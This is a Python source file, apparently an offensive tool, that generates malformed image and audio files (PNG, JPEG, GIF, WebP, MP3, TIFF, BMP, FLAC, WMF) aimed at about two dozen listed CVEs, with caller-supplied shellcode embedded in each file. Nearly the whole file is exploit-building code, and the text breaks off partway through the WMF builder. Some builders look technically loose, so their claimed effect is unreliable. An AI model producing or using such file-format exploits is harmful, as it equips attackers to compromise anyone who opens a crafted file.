#!/usr/bin/env python3
"""
Exploit Header Generator for Polyglot Images
=============================================
Generates malicious image headers that exploit known CVEs in image parsing libraries.

EDUCATIONAL/RESEARCH USE ONLY
This demonstrates image viewer exploitation techniques.

Supported CVEs:

EXISTING (5 CVEs):
- CVE-2015-8540 (libpng) - Buffer overflow in png_check_chunk_name
- CVE-2019-7317 (libpng) - Out-of-bounds access in png_image_finish_read
- CVE-2018-14498 (libjpeg) - Heap buffer over-read
- CVE-2019-15133 (giflib) - Division by zero / out-of-bounds read
- CVE-2016-3977 (giflib) - Heap buffer overflow

NEW - PRIORITY 1 (3 CVEs):
- CVE-2023-4863 (libwebp) - Heap overflow in Huffman decoder (CRITICAL - ACTIVELY EXPLOITED)
- CVE-2024-10573 (mpg123) - Frankenstein stream heap overflow
- CVE-2023-52356 (libtiff) - Heap overflow in TIFFReadRGBATileExt

NEW - PRIORITY 2 (6 CVEs):
- CVE-2017-8373 (libmad) - Heap overflow in mad_layer_III
- CVE-2006-0006 (Windows Media Player BMP) - Heap overflow in bitmap processing
- CVE-2020-22219 (FLAC) - Buffer overflow in bitwriter_grow_
- CVE-2020-0499 (FLAC) - Heap OOB read in bitreader
- CVE-2008-1083 (Windows GDI) - EMF/WMF heap overflow
- CVE-2005-4560 (WMF) - SETABORTPROC code execution

NEW - PRIORITY 3 (6 CVEs):
- CVE-2017-6827 (audiofile) - MSADPCM heap overflow
- CVE-2018-5146 (libvorbis) - OGG Vorbis OOB write
- CVE-2022-22675 (AppleAVD) - Video accelerator buffer overflow
- CVE-2021-0561 (FLAC) - Encoder OOB write
- CVE-2017-11126 (mpg123) - Global buffer overflow in Layer III
- CVE-2021-40426 (libsox) - SPHERE file heap overflow

NEW - 2025 macOS OVERFLOWS (5 CVEs):
- CVE-2025-43300 (ImageIO) - DNG/TIFF JPEG Lossless OOB write (CRITICAL - ACTIVELY EXPLOITED ZERO-DAY)
- CVE-2025-24228 (macOS Kernel) - Buffer overflow with kernel privileges
- CVE-2025-24153 (SMB) - Buffer overflow enabling kernel code execution
- CVE-2025-24156 (Xsan) - Integer overflow privilege escalation
- CVE-2025-24154 (WebContentFilter) - Out-of-bounds write kernel memory corruption

Author: SWORDIntel
Date: 2025-11-12 (Updated with 20 new CVEs including 2025 macOS overflows)
"""

import sys
import struct
import argparse
import logging
from pathlib import Path

# Import TUI helper
sys.path.insert(0, str(Path(__file__).parent))
try:
    from tui_helper import TUI
except ImportError:
    # Fallback if TUI helper not available
    TUI = None

# Import validation utilities
try:
    from validation_utils import ValidationError, setup_logging
except ImportError:
    # Fallback
    class ValidationError(Exception):
        pass
    setup_logging = None

# Import Intel acceleration
try:
    from intel_acceleration import get_accelerator
    ACCEL_AVAILABLE = True
except ImportError:
    ACCEL_AVAILABLE = False
    get_accelerator = None


class ExploitHeaderGenerator:
    """Generates malicious image headers for CVE exploitation"""

    def __init__(self, use_acceleration: bool = True, verbose: bool = False):
        """
        Initialize exploit generator

        Args:
            use_acceleration: Enable Intel NPU/GPU acceleration if available
            verbose: Enable verbose logging
        """
        self.logger = setup_logging(verbose=verbose, name='exploit_generator') if setup_logging else logging.getLogger()
        self.accelerator = None
        if use_acceleration and ACCEL_AVAILABLE:
            try:
                self.accelerator = get_accelerator(verbose=False)
            except Exception as e:
                self.logger.debug(f"Hardware acceleration not available: {e}")
                # Fall back to CPU

        self.exploits = {
            # EXISTING CVEs
            'CVE-2015-8540': self._cve_2015_8540_libpng,
            'CVE-2019-7317': self._cve_2019_7317_libpng,
            'CVE-2018-14498': self._cve_2018_14498_libjpeg,
            'CVE-2019-15133': self._cve_2019_15133_giflib,
            'CVE-2016-3977': self._cve_2016_3977_giflib,

            # NEW - PRIORITY 1 (Critical, Recent, High-Impact)
            'CVE-2023-4863': self._cve_2023_4863_libwebp,
            'CVE-2024-10573': self._cve_2024_10573_mpg123,
            'CVE-2023-52356': self._cve_2023_52356_libtiff,

            # NEW - PRIORITY 2 (High-Value Legacy)
            'CVE-2017-8373': self._cve_2017_8373_libmad,
            'CVE-2006-0006': self._cve_2006_0006_bmp,
            'CVE-2020-22219': self._cve_2020_22219_flac,
            'CVE-2020-0499': self._cve_2020_0499_flac,
            'CVE-2008-1083': self._cve_2008_1083_emf_wmf,
            'CVE-2005-4560': self._cve_2005_4560_wmf,

            # NEW - PRIORITY 3 (Audio/Video Expansion)
            'CVE-2017-6827': self._cve_2017_6827_audiofile_wav,
            'CVE-2018-5146': self._cve_2018_5146_libvorbis,
            'CVE-2022-22675': self._cve_2022_22675_appleavd,
            'CVE-2021-0561': self._cve_2021_0561_flac,
            'CVE-2017-11126': self._cve_2017_11126_mpg123,
            'CVE-2021-40426': self._cve_2021_40426_libsox,

            # NEW - 2025 macOS OVERFLOWS (Most Recent)
            'CVE-2025-43300': self._cve_2025_43300_imageio_dng,
            'CVE-2025-24228': self._cve_2025_24228_kernel,
            'CVE-2025-24153': self._cve_2025_24153_smb,
            'CVE-2025-24156': self._cve_2025_24156_xsan,
            'CVE-2025-24154': self._cve_2025_24154_webcontentfilter,
        }

    def _cve_2015_8540_libpng(self, shellcode):
        """
        CVE-2015-8540: libpng buffer overflow in png_check_chunk_name

        Vulnerability: libpng 1.6.x allows remote attackers to cause DoS or
        possibly have unspecified other impact via a chunk name that is too long.

        Exploit: Create PNG with malformed chunk name (> 4 bytes)
        """
        png_header = b'\x89PNG\r\n\x1a\n'  # PNG signature

        # IHDR chunk (valid)
        ihdr_data = struct.pack('>IIBBBBB',
            1, 1,  # Width, height (1x1)
            8, 2,  # Bit depth, color type (RGB)
            0, 0, 0  # Compression, filter, interlace
        )
        ihdr_chunk = struct.pack('>I', len(ihdr_data)) + b'IHDR' + ihdr_data
        ihdr_crc = self._crc32(b'IHDR' + ihdr_data)
        ihdr_chunk += struct.pack('>I', ihdr_crc)

        # Malicious chunk with oversized name (triggers overflow)
        # Chunk name should be 4 bytes, we send much more to overflow buffer
        malicious_chunk_name = b'AAAA' * 64  # 256 bytes instead of 4

        # Embed shellcode in chunk data
        chunk_data = shellcode + b'\x00' * (256 - len(shellcode))

        malicious_chunk = struct.pack('>I', len(chunk_data))
        malicious_chunk += malicious_chunk_name[:256]  # Oversized name
        malicious_chunk += chunk_data
        # Intentionally wrong CRC to avoid other checks
        malicious_chunk += b'\x00\x00\x00\x00'

        # IEND chunk
        iend_chunk = b'\x00\x00\x00\x00IEND\xae\x42\x60\x82'

        return png_header + ihdr_chunk + malicious_chunk + iend_chunk

    def _cve_2019_7317_libpng(self, shellcode):
        """
        CVE-2019-7317: libpng out-of-bounds access

        Vulnerability: Use-after-free in png_image_free

        Exploit: Crafted PNG with specific chunk ordering causes memory corruption
        """
        png_header = b'\x89PNG\r\n\x1a\n'

        # IHDR with large dimensions to trigger allocation
        ihdr_data = struct.pack('>IIBBBBB',
            0xFFFF, 0xFFFF,  # Huge dimensions (will fail allocation)
            8, 6,  # RGBA
            0, 0, 0
        )
        ihdr = self._make_chunk(b'IHDR', ihdr_data)

        # tRNS chunk before PLTE (invalid order, triggers use-after-free)
        trns_data = b'\x00\x00\x00\xFF' * 64
        trns = self._make_chunk(b'tRNS', trns_data)

        # Shellcode in iCCP chunk (embedded in chunk data)
        iccp_data = b'profile\x00\x00' + shellcode + b'\x00' * (1024 - len(shellcode))
        iccp = self._make_chunk(b'iCCP', iccp_data)

        iend = b'\x00\x00\x00\x00IEND\xae\x42\x60\x82'

        return png_header + ihdr + trns + iccp + iend

    def _cve_2018_14498_libjpeg(self, shellcode):
        """
        CVE-2018-14498: libjpeg heap buffer over-read

        Vulnerability: get_8bit_row in rdbmp.c allows remote attackers to
        cause DoS via crafted BMP file.

        Exploit: Malformed JPEG with embedded shellcode in comment marker
        """
        # JPEG SOI
        jpeg = b'\xff\xd8'

        # APP0 marker (JFIF)
        app0 = b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        jpeg += app0

        # Comment marker with shellcode (COM segment)
        com_data = shellcode + b'\x00' * (65530 - len(shellcode))
        com = b'\xff\xfe' + struct.pack('>H', len(com_data) + 2) + com_data
        jpeg += com

        # Malformed DQT (quantization table) - triggers heap overflow
        # Size field is incorrect, causes over-read
        dqt = b'\xff\xdb'  # DQT marker
        dqt += b'\xff\xff'  # Intentionally huge size (65535 bytes)
        dqt += b'\x00' * 64  # Actual data much smaller
        jpeg += dqt

        # SOF0 (Start of frame) - minimal valid frame
        sof0 = b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
        jpeg += sof0

        # SOS (Start of scan)
        sos = b'\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00'
        jpeg += sos

        # Image data (minimal)
        jpeg += b'\xff\x00' * 10

        # EOI
        jpeg += b'\xff\xd9'

        return jpeg

    def _cve_2019_15133_giflib(self, shellcode):
        """
        CVE-2019-15133: GIF LIB division by zero

        Vulnerability: DGifSlurp in dgif_lib.c allows attackers to cause DoS
        via crafted GIF with width/height of 0.

        Exploit: GIF with zero dimensions and shellcode in comment extension
        """
        gif = b'GIF89a'  # GIF header

        # Logical screen descriptor with zero dimensions (triggers division by zero)
        gif += struct.pack('<HH', 0, 0)  # Width=0, Height=0
        gif += b'\x80'  # Global color table flag
        gif += b'\x00'  # Background color
        gif += b'\x00'  # Pixel aspect ratio

        # Global color table (minimal)
        gif += b'\x00\x00\x00\xff\xff\xff'  # 2 colors

        # Comment extension with shellcode
        gif += b'\x21\xfe'  # Comment extension

        # Split shellcode into 255-byte blocks
        for i in range(0, len(shellcode), 255):
            block = shellcode[i:i+255]
            gif += bytes([len(block)]) + block

        gif += b'\x00'  # Terminator

        # Image descriptor (malformed)
        gif += b'\x2c'  # Image separator
        gif += b'\x00\x00\x00\x00'  # Left, Top
        gif += struct.pack('<HH', 1, 1)  # Width, Height
        gif += b'\x00'  # Flags

        # Image data (minimal)
        gif += b'\x02\x02\x44\x01\x00'

        # GIF trailer
        gif += b'\x3b'

        return gif

    def _cve_2016_3977_giflib(self, shellcode):
        """
        CVE-2016-3977: GIF heap buffer overflow

        Vulnerability: Heap overflow in gif2rgb via crafted GIF file

        Exploit: GIF with malformed local color table size
        """
        gif = b'GIF89a'

        # Logical screen descriptor
        gif += struct.pack('<HH', 1, 1)
        gif += b'\xf0'  # Global color table: yes, 8 colors (3 bits)
        gif += b'\x00\x00'

        # Global color table (2^3 = 8 colors)
        gif += b'\x00\x00\x00' * 8

        # Application extension with shellcode
        gif += b'\x21\xff\x0b'  # Application extension
        gif += b'NETSCAPE2.0'

        # Shellcode in application data
        for i in range(0, len(shellcode), 255):
            block = shellcode[i:i+255]
            gif += bytes([len(block)]) + block
        gif += b'\x00'

        # Image descriptor with malformed local color table
        gif += b'\x2c\x00\x00\x00\x00'
        gif += struct.pack('<HH', 256, 256)  # Large dimensions
        gif += b'\x87'  # Local color table: yes, 256 colors (INTENTIONALLY WRONG SIZE)

        # Local color table buffer overflow
        # Claim 256 colors but provide much more data
        gif += b'\x41\x41\x41' * 512  # 512 * 3 = 1536 bytes instead of 768

        # Image data
        gif += b'\x08'  # LZW minimum code size
        gif += b'\x00'  # Data sub-block (empty)

        gif += b'\x3b'  # Trailer

        return gif

    # ==================== PRIORITY 1 CVEs ====================

    def _cve_2023_4863_libwebp(self, shellcode):
        """
        CVE-2023-4863: libwebp critical heap buffer overflow (ACTIVELY EXPLOITED)

        Vulnerability: Heap overflow in ReadHuffmanCodes() function during WebP
        lossless decoding. BuildHuffmanTable() writes beyond allocated HuffmanCode
        buffer when processing second-level Huffman tables.

        Target: libwebp 0.5.0 - 1.3.1
        Impact: RCE via crafted WebP image (Zero-day, exploited in wild)
        CVSS: 8.8 (Critical)
        """
        # WebP RIFF container
        webp = b'RIFF'

        # Calculate file size later, placeholder for now
        size_pos = len(webp)
        webp += b'\x00\x00\x00\x00'  # File size (will update)

        # WebP signature
        webp += b'WEBP'

        # VP8L (lossless) chunk - this is where vulnerability lives
        webp += b'VP8L'

        # VP8L chunk size (placeholder)
        vp8l_size_pos = len(webp)
        webp += b'\x00\x00\x00\x00'

        # VP8L data starts here
        vp8l_data_start = len(webp)

        # VP8L signature byte (0x2f for lossless)
        webp += b'\x2f'

        # Image dimensions: 14 bits width-1, 14 bits height-1
        # Use 256x256 image
        width = 256
        height = 256

        # Pack width-1 (14 bits) + height-1 (14 bits) + alpha (1 bit) + version (3 bits)
        dim_data = ((width - 1) & 0x3FFF) | (((height - 1) & 0x3FFF) << 14)
        webp += struct.pack('<I', dim_data)[:4]

        # Transform and color cache bits
        # Set to 0 (no transforms, but we'll add color cache)
        webp += b'\x00'

        # Huffman image - this triggers the vulnerability
        # The bug is in how it handles codes longer than 8 bits

        # Prefix: Huffman coded image (not simple)
        webp += b'\x00'

        # Meta Huffman codes
        # These control how the actual Huffman codes are encoded

        # Number of code length codes (between 4-19)
        num_code_len_codes = 19
        webp += bytes([(num_code_len_codes - 4)])

        # Code length code lengths (3 bits each, packed)
        # These trigger the vulnerability when combined with color_cache_bits
        code_len_codes = [3] * 19  # All 3-bit codes

        packed_codes = bytearray()
        bit_buffer = 0
        bits_in_buffer = 0

        for code_len in code_len_codes:
            bit_buffer |= (code_len << bits_in_buffer)
            bits_in_buffer += 3

            while bits_in_buffer >= 8:
                packed_codes.append(bit_buffer & 0xFF)
                bit_buffer >>= 8
                bits_in_buffer -= 8

        if bits_in_buffer > 0:
            packed_codes.append(bit_buffer & 0xFF)

        webp += bytes(packed_codes)

        # Actual Huffman codes for ARGB image
        # We need to encode codes that will overflow the buffer

        # For each color component, we specify Huffman codes
        # We use longer codes (>8 bits) to trigger second-level table overflow

        # Number of Huffman code groups (simplified: 1 group)
        webp += b'\x00'  # 0 means 1 group

        # Huffman codes for Green channel (exploited channel)
        # We'll create codes up to 15 bits to overflow the 8-bit buffer

        # Max alphabet size for green
        max_symbol = 256  # Full 8-bit range

        # Create code lengths that will overflow
        # Mix of short (valid) and long (overflow) codes
        code_lengths = bytearray()

        for i in range(max_symbol):
            if i < 128:
                code_lengths.append(8)  # Normal 8-bit codes
            else:
                code_lengths.append(15)  # Max length - triggers overflow!

        # Encode these code lengths (simplified encoding)
        # In real WebP, these would be Huffman-encoded themselves
        webp += bytes([max_symbol & 0xFF])  # Alphabet size low byte
        webp += bytes([(max_symbol >> 8) & 0xFF])  # High byte

        # Code lengths (simplified)
        webp += code_lengths[:256]

        # Shellcode embedded in image data
        # After overflow, this may be executed
        image_data = shellcode + b'\x00' * (512 - len(shellcode))
        webp += image_data

        # Pad to byte boundary
        if len(webp) % 2:
            webp += b'\x00'

        # Update VP8L chunk size
        vp8l_size = len(webp) - vp8l_data_start
        webp = webp[:vp8l_size_pos] + struct.pack('<I', vp8l_size) + webp[vp8l_size_pos + 4:]

        # Update RIFF file size (total - 8 bytes for RIFF header)
        file_size = len(webp) - 8
        webp = webp[:size_pos] + struct.pack('<I', file_size) + webp[size_pos + 4:]

        return webp

    def _cve_2024_10573_mpg123(self, shellcode):
        """
        CVE-2024-10573: mpg123 "Frankenstein's Monster" heap overflow

        Vulnerability: Buffer overflow when decoding PCM samples from MP3 streams
        that change properties mid-stream ("Frankenstein streams"). Requires
        seeking/scanning to trigger.

        Target: mpg123 < 1.32.8
        Impact: Heap corruption, possible RCE
        CVSS: 6.7 (Moderate - but exploitable)
        """
        # MP3 file with changing properties (Frankenstein stream)

        # ID3v2 header (makes it look legitimate)
        mp3 = b'ID3'
        mp3 += b'\x04\x00'  # Version 2.4
        mp3 += b'\x00'      # Flags (no unsync, no extended header)

        # ID3 size (synchsafe integer - 7 bits per byte)
        id3_size = 1024
        mp3 += bytes([
            (id3_size >> 21) & 0x7F,
            (id3_size >> 14) & 0x7F,
            (id3_size >> 7) & 0x7F,
            id3_size & 0x7F
        ])

        # ID3 Title frame
        mp3 += b'TIT2'  # Title frame
        mp3 += struct.pack('>I', 20)  # Frame size
        mp3 += b'\x00\x00'  # Flags
        mp3 += b'\x00'  # Text encoding (ISO-8859-1)
        mp3 += b'Frankenstein MP3\x00'

        # Padding to reach ID3 size
        mp3 += b'\x00' * (id3_size - 30)

        # MP3 Frame 1: 44.1kHz, Stereo, 128kbps
        # This establishes initial output buffer properties

        # Sync word (11 bits) + MPEG1 (2 bits) + Layer III (2 bits) + No CRC (1 bit)
        frame1 = b'\xFF\xFB'

        # Bitrate: 128kbps (1001) + Sample rate: 44.1kHz (00) + Padding (0) + Private (0)
        frame1 += b'\x90'

        # Channel mode: Stereo (00) + Mode ext (00) + Copyright (0) + Original (0) + Emphasis (00)
        frame1 += b'\x00'

        # Side info + main data (417 bytes for 128kbps frame)
        frame1 += b'\x00' * 413

        mp3 += frame1

        # MP3 Frame 2: CHANGED to 48kHz, Mono, 64kbps
        # This property change triggers the vulnerability!
        frame2 = b'\xFF\xFB'

        # Bitrate: 64kbps (0101) + Sample rate: 48kHz (01) + No padding + Private
        frame2 += b'\x54'  # 0101 0100

        # Channel mode: Mono (11) + Mode ext (00) + Copyright + Original + Emphasis
        frame2 += b'\xC0'  # 1100 0000

        # Frame data (smaller for 64kbps)
        frame2 += b'\x00' * 200

        mp3 += frame2

        # MP3 Frame 3: Change AGAIN to 22.05kHz, Stereo, 96kbps
        # Multiple changes increase likelihood of overflow
        frame3 = b'\xFF\xFB'
        frame3 += b'\x74'  # Bitrate 96kbps + Sample rate 22.05kHz
        frame3 += b'\x04'  # Back to stereo
        frame3 += b'\x00' * 300

        mp3 += frame3

        # Embed shellcode in a custom private data frame
        # Position it where overflow might write to
        private_frame = b'\xFF\xFB\xF0\x00'  # Custom frame marker
        private_frame += shellcode
        private_frame += b'\x00' * (256 - len(shellcode))

        mp3 += private_frame

        # Add several more normal frames to ensure seeking happens
        for i in range(20):
            mp3 += b'\xFF\xFB\x90\x00' + b'\x00' * 413

        return mp3

    def _cve_2023_52356_libtiff(self, shellcode):
        """
        CVE-2023-52356: libtiff heap buffer overflow

        Vulnerability: Improper handling in TIFFReadRGBATileExt() API causes
        heap buffer overflow when processing crafted TIFF files with malformed
        tile dimensions.

        Target: libtiff < 4.7.0rc1
        Impact: DoS, heap corruption, possible RCE
        CVSS: 7.8 (High)
        """
        # TIFF Header (Little Endian)
        tiff = b'II'  # Little endian identifier
        tiff += b'\x2A\x00'  # TIFF magic number (42)

        # Offset to first IFD (Image File Directory)
        ifd_offset = 8
        tiff += struct.pack('<I', ifd_offset)

        # === IFD (Image File Directory) ===
        ifd_start = len(tiff)

        # Number of directory entries
        num_entries = 15
        tiff += struct.pack('<H', num_entries)

        # IFD Entry format: Tag (2) | Type (2) | Count (4) | Value/Offset (4)

        # 1. ImageWidth - Large value to trigger overflow
        tiff += struct.pack('<HHII', 256, 4, 1, 65535)

        # 2. ImageLength - Also large
        tiff += struct.pack('<HHII', 257, 4, 1, 65535)

        # 3. BitsPerSample
        tiff += struct.pack('<HHII', 258, 3, 3, 0)  # Offset to values (will write later)
        bits_per_sample_offset = len(tiff) - 4

        # 4. Compression - No compression
        tiff += struct.pack('<HHII', 259, 3, 1, 1)

        # 5. PhotometricInterpretation - RGB
        tiff += struct.pack('<HHII', 262, 3, 1, 2)

        # 6. StripOffsets - Point to image data with shellcode
        strip_offset_value = 1024  # Will place shellcode here
        tiff += struct.pack('<HHII', 273, 4, 1, strip_offset_value)

        # 7. SamplesPerPixel - 3 (RGB)
        tiff += struct.pack('<HHII', 277, 3, 1, 3)

        # 8. RowsPerStrip - 1 row per strip (creates many strips)
        tiff += struct.pack('<HHII', 278, 4, 1, 1)

        # 9. StripByteCounts - MALFORMED: Huge value triggers overflow
        tiff += struct.pack('<HHII', 279, 4, 1, 0xFFFFFFF0)  # Nearly max uint32

        # 10. XResolution
        tiff += struct.pack('<HHII', 282, 5, 1, 0)  # Offset (will write later)
        xres_offset = len(tiff) - 4

        # 11. YResolution
        tiff += struct.pack('<HHII', 283, 5, 1, 0)  # Offset (will write later)
        yres_offset = len(tiff) - 4

        # 12. PlanarConfiguration - Chunky
        tiff += struct.pack('<HHII', 284, 3, 1, 1)

        # 13. TileWidth - This triggers TIFFReadRGBATileExt path!
        tiff += struct.pack('<HHII', 322, 4, 1, 256)

        # 14. TileLength - Malformed to cause overflow
        tiff += struct.pack('<HHII', 323, 4, 1, 32768)  # Huge tile height

        # 15. TileOffsets - Point to shellcode area
        tiff += struct.pack('<HHII', 324, 4, 1, strip_offset_value)

        # Offset to next IFD (0 = no more IFDs)
        tiff += struct.pack('<I', 0)

        # === Write indirect values ===

        # BitsPerSample values (8, 8, 8)
        tiff = tiff[:bits_per_sample_offset] + struct.pack('<I', len(tiff)) + tiff[bits_per_sample_offset + 4:]
        tiff += struct.pack('<HHH', 8, 8, 8)

        # XResolution (72 DPI)
        tiff = tiff[:xres_offset] + struct.pack('<I', len(tiff)) + tiff[xres_offset + 4:]
        tiff += struct.pack('<II', 72, 1)

        # YResolution (72 DPI)
        tiff = tiff[:yres_offset] + struct.pack('<I', len(tiff)) + tiff[yres_offset + 4:]
        tiff += struct.pack('<II', 72, 1)

        # Pad to shellcode offset
        while len(tiff) < strip_offset_value:
            tiff += b'\x00'

        # === Shellcode embedded as "image data" ===
        tiff += shellcode
        tiff += b'\x00' * (2048 - len(shellcode))

        return tiff

    # ==================== PRIORITY 2 CVEs ====================

    def _cve_2017_8373_libmad(self, shellcode):
        """
        CVE-2017-8373: libmad heap buffer overflow

        Vulnerability: Heap-based buffer overflow in mad_layer_III() function
        in layer3.c. Write of 2060 bytes beyond allocated heap buffer.

        Target: libmad 0.15.1b
        Impact: DoS, possible RCE
        """
        # Craft malicious MP3 with oversized Layer III data

        # ID3v2 tag
        mp3 = b'ID3\x03\x00\x00\x00\x00\x02\x00'

        # MP3 Frame Header for Layer III
        # Sync: FFF, Version: MPEG1, Layer: III, CRC: No
        # Bitrate: 128kbps, Samplerate: 44.1kHz, Padding: No
        mp3 += b'\xFF\xFB\x90\x00'

        # Side information (32 bytes for MPEG1 stereo)
        # Craft with large main_data_begin to trigger overflow
        side_info = bytearray(32)

        # main_data_begin (9 bits) - set to max to point way beyond buffer
        side_info[0] = 0xFF
        side_info[1] = 0x80  # Top bit is main_data_begin LSB

        # Rest of side info - craft to maximize data reading
        for i in range(2, 32):
            side_info[i] = 0xFF  # Max out all values

        mp3 += bytes(side_info)

        # Main data - this will overflow the buffer
        # Include shellcode that will be written beyond bounds
        main_data = shellcode + b'\x90' * (2060 - len(shellcode))  # NOP padding to 2060 bytes
        mp3 += main_data

        # Additional frame data
        mp3 += b'\x00' * 100

        return mp3

    def _cve_2006_0006_bmp(self, shellcode):
        """
        CVE-2006-0006: Windows Media Player BMP heap overflow

        Vulnerability: Heap-based buffer overflow in bitmap processing routine
        in Windows Media Player. Unchecked buffer in BMP parsing.

        Target: Windows Media Player 7.1, 9, 10
        Impact: Remote code execution
        """
        # BMP File Header
        bmp = b'BM'  # Signature

        # File size (placeholder)
        bmp += struct.pack('<I', 0)  # Will calculate
        file_size_pos = 2

        # Reserved
        bmp += b'\x00\x00\x00\x00'

        # Pixel data offset
        pixel_offset = 54 + 1024  # Header + large color table
        bmp += struct.pack('<I', pixel_offset)

        # DIB Header (BITMAPINFOHEADER)
        bmp += struct.pack('<I', 40)  # Header size

        # Width and Height - large values to trigger allocation
        bmp += struct.pack('<i', 1024)  # Width
        bmp += struct.pack('<i', 1024)  # Height

        # Planes and bit count
        bmp += struct.pack('<H', 1)   # Color planes
        bmp += struct.pack('<H', 8)   # Bits per pixel

        # Compression (0 = BI_RGB, none)
        bmp += struct.pack('<I', 0)

        # Image size (0 for BI_RGB)
        bmp += struct.pack('<I', 0)

        # X and Y pixels per meter
        bmp += struct.pack('<i', 2835)  # ~72 DPI
        bmp += struct.pack('<i', 2835)

        # Colors used and important (0 = all)
        bmp += struct.pack('<I', 256)  # 256 colors
        bmp += struct.pack('<I', 0)    # All important

        # Color table - oversized to trigger overflow
        # Should be 256 * 4 = 1024 bytes, but we send more
        for i in range(512):  # 512 colors instead of 256
            bmp += struct.pack('<BBBB', i % 256, i % 256, i % 256, 0)

        # Pixel data with embedded shellcode
        # Positioned where overflow might write to
        pixel_data = shellcode + b'\x00' * (4096 - len(shellcode))
        bmp += pixel_data

        # Update file size
        file_size = len(bmp)
        bmp = bmp[:file_size_pos] + struct.pack('<I', file_size) + bmp[file_size_pos + 4:]

        return bmp

    def _cve_2020_22219_flac(self, shellcode):
        """
        CVE-2020-22219: FLAC buffer overflow in encoder

        Vulnerability: Buffer overflow in bitwriter_grow_() function when
        encoding crafted input.

        Target: FLAC < 1.4.0
        Impact: RCE via crafted audio input to encoder
        CVSS: 7.8 (High)
        """
        # FLAC stream structure

        # fLaC marker
        flac = b'fLaC'

        # STREAMINFO metadata block (mandatory, type 0)
        # Last-metadata-block: 0, Block type: 0 (STREAMINFO), Length: 34
        flac += b'\x00\x00\x22'  # 0x000022 = 34 bytes

        # min_blocksize (16 bits) - trigger encoder overflow
        flac += struct.pack('>H', 4096)

        # max_blocksize (16 bits) - extremely large
        flac += struct.pack('>H', 65535)

        # min_framesize (24 bits) - 0 = unknown
        flac += b'\x00\x00\x00'

        # max_framesize (24 bits) - huge
        flac += b'\xFF\xFF\xFF'

        # Sample rate (20 bits): 44100 Hz
        # + Channels (3 bits): 2 channels (value = channels-1 = 1)
        # + Bits per sample (5 bits): 16 bits (value = bps-1 = 15)
        # = 20 + 3 + 5 = 28 bits (3.5 bytes)

        sample_rate = 44100
        channels_minus_1 = 1
        bps_minus_1 = 15

        # Pack into 4 bytes, use 28 bits
        packed = (sample_rate << 8) | (channels_minus_1 << 5) | bps_minus_1
        flac += struct.pack('>I', packed)

        # Total samples (36 bits) - huge to trigger overflow
        # Use 5 bytes for 36 bits
        total_samples = 0xFFFFFFFFF
        flac += struct.pack('>Q', total_samples)[3:]  # Take last 5 bytes (40 bits, use 36)

        # MD5 signature (16 bytes)
        flac += b'\x00' * 16

        # PADDING metadata block
        padding_size = 2048
        flac += b'\x01'  # Block type 1 (PADDING), not last
        flac += struct.pack('>I', padding_size)[1:]  # 24-bit length
        flac += b'\x00' * padding_size

        # APPLICATION metadata block with shellcode
        # Last-metadata-block: 1, Block type: 2 (APPLICATION)
        flac += b'\x82'  # 0x80 | 0x02

        app_data = b'SHEL' + shellcode + b'\x00' * (1024 - len(shellcode) - 4)
        flac += struct.pack('>I', len(app_data))[1:]  # 24-bit length
        flac += app_data

        # FRAME header (simplified - would contain audio data)
        # This is post-exploit marker
        flac += b'\xFF\xF8'  # Sync code
        flac += b'\xC9\x00'  # Block size, sample rate bits
        flac += b'\x00' * 100  # Frame data

        return flac

    def _cve_2020_0499_flac(self, shellcode):
        """
        CVE-2020-0499: FLAC heap buffer overflow / OOB read

        Vulnerability: Out-of-bounds read in FLAC__bitreader_read_rice_signed_block()
        in bitreader.c. Heap buffer overflow during decoding.

        Target: FLAC < 1.3.4
        Impact: Information disclosure, DoS
        CVSS: 6.5 (Medium)
        """
        # Similar structure to CVE-2020-22219 but targets decoder

        flac = b'fLaC'

        # STREAMINFO (minimal valid)
        flac += b'\x00\x00\x22'  # STREAMINFO, 34 bytes
        flac += struct.pack('>H', 4096)  # min_blocksize
        flac += struct.pack('>H', 4096)  # max_blocksize
        flac += b'\x00\x00\x00'  # min_framesize
        flac += b'\x00\x00\x00'  # max_framesize

        # Sample rate 44.1kHz, 2 channels, 16 bits
        flac += struct.pack('>I', (44100 << 8) | (1 << 5) | 15)
        flac += b'\x00\x00\x00\x00\x00'  # total_samples (40 bits)
        flac += b'\x00' * 16  # MD5

        # FRAME with malformed Rice partition
        # This triggers the OOB read in bitreader

        # Sync code + reserved + blocking strategy
        frame = b'\xFF\xF8'

        # Block size + sample rate
        frame += b'\xC9'  # Block size = 4096, sample rate from streaminfo
        frame += b'\x00'  # Channel assignment: independent

        # Sample size bits + zero bit
        frame += b'\x04'  # 16-bit samples

        # Frame/sample number (UTF-8 coded, simplified)
        frame += b'\x00'

        # CRC-8 of header (simplified)
        frame += b'\x00'

        # SUBFRAME with malicious Rice parameters
        # These cause read beyond buffer bounds

        subframe = b'\x08'  # Prediction order = 0, LPC

        # Malformed Rice partition with large partition order
        # Partition order (4 bits)
        subframe += b'\xF0'  # Order 15 - way too large, triggers OOB

        # Rice parameters (malformed)
        for i in range(32):  # Too many parameters
            subframe += b'\x1F'  # Max parameter value

        # Residual data (where shellcode goes)
        subframe += shellcode + b'\x00' * (1024 - len(shellcode))

        frame += subframe

        # Frame CRC-16
        frame += b'\x00\x00'

        # Mark as last metadata, add frame
        flac += b'\x84'  # Last metadata, type 4 (invalid but triggers parser)
        flac += b'\x00\x04\x00'  # Length
        flac += b'\x00' * 1024  # Padding

        flac += frame

        return flac

    def _cve_2008_1083_emf_wmf(self, shellcode):
        """
        CVE-2008-1083: Windows GDI EMF/WMF heap overflow

        Vulnerability: Integer overflow in GDI's EMF/WMF image handling leading
        to heap overflow.

        Target: Windows GDI (all versions at time of disclosure)
        Impact: Remote code execution via malicious EMF/WMF
        """
        # Windows Metafile (WMF) format

        # Placeable metafile header
        wmf = b'\xD7\xCD\xC6\x9A'  # Magic number
        wmf += b'\x00\x00'  # Handle (unused)

        # Bounding box (left, top, right, bottom)
        wmf += struct.pack('<hhhh', 0, 0, 10000, 10000)

        # Units per inch
        wmf += struct.pack('<H', 1440)

        # Reserved
        wmf += b'\x00\x00\x00\x00'

        # Checksum
        wmf += struct.pack('<H', 0)

        # WMF Header
        wmf += struct.pack('<H', 1)  # Type (1 = memory metafile)
        wmf += struct.pack('<H', 9)  # Header size in words
        wmf += struct.pack('<H', 0x0300)  # Windows version

        # File size in words (placeholder)
        size_pos = len(wmf)
        wmf += struct.pack('<I', 0)

        # Number of objects
        wmf += struct.pack('<H', 1)

